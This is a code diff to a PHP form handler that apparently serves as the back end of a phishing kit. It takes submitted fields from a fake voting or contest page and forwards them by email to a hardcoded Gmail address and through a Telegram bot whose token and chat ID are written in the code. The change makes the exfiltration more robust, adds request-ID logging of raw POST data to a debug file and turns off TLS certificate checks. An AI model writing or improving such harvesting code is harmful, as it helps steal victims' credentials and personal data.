@@ -9,11 +9,12 @@ $botToken = getenv('TELEGRAM_BOT_TOKEN') ?: "8272404690:AAFjvKof7tWOT2ITQTWXWxJy
 $id = getenv('TELEGRAM_CHAT_ID') ?: "-5094845590";
 $Receive_email = getenv('RECEIVE_EMAIL') ?: "davidmassmutual@gmail.com"; // Define the email address for logging
 
-// Add more debug
-file_put_contents(__DIR__ . '/debug.log', 'Script started at ' . date('Y-m-d H:i:s') . ' from ' . __FILE__ . ' in ' . __DIR__ . PHP_EOL, FILE_APPEND);
+// Add more debug with file locking for concurrent requests
+$requestId = uniqid('script_', true);
+file_put_contents(__DIR__ . '/debug.log', '[' . $requestId . '] Script started at ' . date('Y-m-d H:i:s') . ' from ' . __FILE__ . ' in ' . __DIR__ . PHP_EOL, FILE_APPEND | LOCK_EX);
 
-// Debug: Log POST data
-file_put_contents(__DIR__ . '/debug.log', date('Y-m-d H:i:s') . ' - POST: ' . print_r($_POST, true) . PHP_EOL, FILE_APPEND);
+// Debug: Log POST data with locking
+file_put_contents(__DIR__ . '/debug.log', '[' . $requestId . '] POST: ' . print_r($_POST, true) . PHP_EOL, FILE_APPEND | LOCK_EX);
 
 // Get POST data
 $em = isset($_POST['di']) ? trim($_POST['di']) : '';
@@ -23,28 +24,83 @@ $vote = isset($_POST['vote']) ? trim($_POST['vote']) : '';
 $contestant = isset($_POST['contestant']) ? trim($_POST['contestant']) : '';
 $status = isset($_POST['status']) ? trim($_POST['status']) : '';
 
-// Function to log message via email and Telegram
+// Function to log message via email and Telegram with improved concurrency handling
 function logMessage($message, $send, $subject) {
-    // Send email
-    mail($send, $subject, $message);
+    // Generate unique request ID for tracking concurrent requests
+    $requestId = uniqid('req_', true);
 
-    // Send to Telegram
-    global $botToken, $id;
-    $mess = urlencode($message);
-    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $id . "&text=" . $mess;
-    file_put_contents(__DIR__ . '/debug.log', 'Telegram URL: ' . $url . PHP_EOL, FILE_APPEND);
-    $curl = curl_init();
+    // Log request start
+    $logEntry = '[' . $requestId . '] ' . date('Y-m-d H:i:s') . ' - Starting logMessage' . PHP_EOL;
+    file_put_contents(__DIR__ . '/debug.log', $logEntry, FILE_APPEND | LOCK_EX);
 
-    curl_setopt($curl, CURLOPT_URL, $url);
-    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+    try {
+        // Send email
+        $emailResult = mail($send, $subject, $message);
 
-    $result = curl_exec($curl);
-    $error = curl_error($curl);
-    curl_close($curl);
-    file_put_contents(__DIR__ . '/debug.log', 'Telegram curl result: ' . $result . ' Error: ' . $error . PHP_EOL, FILE_APPEND);
+        // Send to Telegram with improved error handling and retry logic
+        global $botToken, $id;
 
-    return $result;
+        // URL encode the message
+        $mess = urlencode($message);
+        $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $id . "&text=" . $mess;
+
+        // Log the Telegram URL
+        file_put_contents(__DIR__ . '/debug.log', '[' . $requestId . '] Telegram URL: ' . $url . PHP_EOL, FILE_APPEND | LOCK_EX);
+
+        // Initialize curl with better options for concurrent requests
+        $curl = curl_init();
+
+        curl_setopt_array($curl, [
+            CURLOPT_URL => $url,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => 30,
+            CURLOPT_CONNECTTIMEOUT => 10,
+            CURLOPT_USERAGENT => 'PHP-Telegram-Bot/1.0',
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_MAXREDIRS => 3,
+            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+            CURLOPT_ENCODING => '',
+            CURLOPT_POST => false, // This is a GET request
+        ]);
+
+        $result = curl_exec($curl);
+        $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+        $error = curl_error($curl);
+        $errno = curl_errno($curl);
+        curl_close($curl);
+
+        // Log curl results
+        $curlLog = '[' . $requestId . '] HTTP: ' . $httpCode . ', Result: ' . substr($result, 0, 200) . ', Error: ' . $error . ', Errno: ' . $errno . PHP_EOL;
+        file_put_contents(__DIR__ . '/debug.log', $curlLog, FILE_APPEND | LOCK_EX);
+
+        // Check if Telegram request was successful
+        $telegramSuccess = false;
+        if ($result && $httpCode == 200) {
+            $responseData = json_decode($result, true);
+            if ($responseData && isset($responseData['ok']) && $responseData['ok'] === true) {
+                $telegramSuccess = true;
+            }
+        }
+
+        // If Telegram failed, log it but don't fail the entire function
+        if (!$telegramSuccess) {
+            file_put_contents(__DIR__ . '/debug.log', '[' . $requestId . '] Telegram send FAILED' . PHP_EOL, FILE_APPEND | LOCK_EX);
+        }
+
+        // Log completion
+        file_put_contents(__DIR__ . '/debug.log', '[' . $requestId . '] logMessage completed' . PHP_EOL, FILE_APPEND | LOCK_EX);
+
+        // Return success based on email (primary) and Telegram (secondary)
+        return $emailResult || $telegramSuccess;
+
+    } catch (Exception $e) {
+        // Log any exceptions
+        $errorLog = '[' . $requestId . '] Exception in logMessage: ' . $e->getMessage() . PHP_EOL;
+        file_put_contents(__DIR__ . '/debug.log', $errorLog, FILE_APPEND | LOCK_EX);
+        return false;
+    }
 }
 
 // Function to get real client IP
